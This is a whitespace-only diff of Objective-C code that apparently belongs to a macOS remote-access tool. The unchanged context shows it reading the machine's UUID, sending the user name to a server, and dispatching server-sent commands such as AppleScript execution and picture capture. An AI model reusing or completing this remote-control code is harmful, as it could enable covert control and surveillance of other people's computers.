@@ -54,12 +54,12 @@ NSString *getUUID() {
     io_service_t platformExpert = IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("IOPlatformExpertDevice"));
     if (!platformExpert)
         return nil;
-    
+
     CFTypeRef serialNumberAsCFString = IORegistryEntryCreateCFProperty(platformExpert,CFSTR(kIOPlatformUUIDKey),kCFAllocatorDefault, 0);
     IOObjectRelease(platformExpert);
     if (!serialNumberAsCFString)
         return nil;
-    
+
     return (__bridge NSString *)(serialNumberAsCFString);;
 }
 
@@ -92,7 +92,7 @@ void connectToServer(NSDictionary *arguments) {
         printf("Handshake Failed\n");
         return;
     }
-    
+
     //Send device name
     NSDictionary *deviceInfo = [[NSMutableDictionary alloc] init];
     [deviceInfo setValue:NSUserName() forKey:@"username"];
@@ -119,7 +119,7 @@ void interact(NSDictionary *arguments) {
         NSString *cmd = [jsonDict objectForKey:@"cmd"];
         NSString *args = [jsonDict objectForKey:@"args"];
         esCommand->terminator = (char*)[[jsonDict objectForKey:@"term"] UTF8String];
-        
+
         if ([cmd isEqualToString:@"applescript"]) {
             [esCommand runAppleScript:args];
         } else if ([cmd isEqualToString:@"picture"]) {
